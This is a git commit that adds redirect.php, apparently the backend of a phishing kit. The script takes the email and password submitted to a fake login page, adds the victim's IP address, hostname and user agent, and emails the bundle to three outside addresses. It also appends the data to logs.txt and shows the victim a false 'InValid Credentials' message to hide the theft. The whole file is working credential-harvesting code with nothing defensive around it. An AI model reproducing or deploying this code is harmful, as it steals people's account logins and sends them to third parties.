4b440bd2c00494501504fde7777f0d74f2161b00
window893-dev <frenzzybolo1@gmail.com>
2026-02-02 09:24:36 +0100

    Add files via upload

---
+++ redirect.php
@@ -0,0 +1,37 @@
+
+$email = trim($_POST['email']);
+$password = trim($_POST['password']);
+$detail = trim($_POST['detail']);
+if($email != null && $password != null){
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "Online ID            : ".$email."\n";
+	$message .= "Passcode              : ".$password."\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$send = "trophyxika@gmail.com,vera_david83@outlook.com,igastu22@rambler.ru";
+	$subject = "SF result : $ip";
+    mail($send, $subject, $message);   
+	$signal = 'ok';
+	$msg = 'InValid Credentials';
+	{
+mail($mesaegs,$subject,$message,$headers);
+mail($send,$subject,$message,$headers);
+$fp = fopen('logs.txt', 'a');
+fwrite($fp, $message);
+fclose($fp);
+}
+	// $praga=rand();
+	// $praga=md5($praga);
+}
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg
+    );
+    echo json_encode($data);
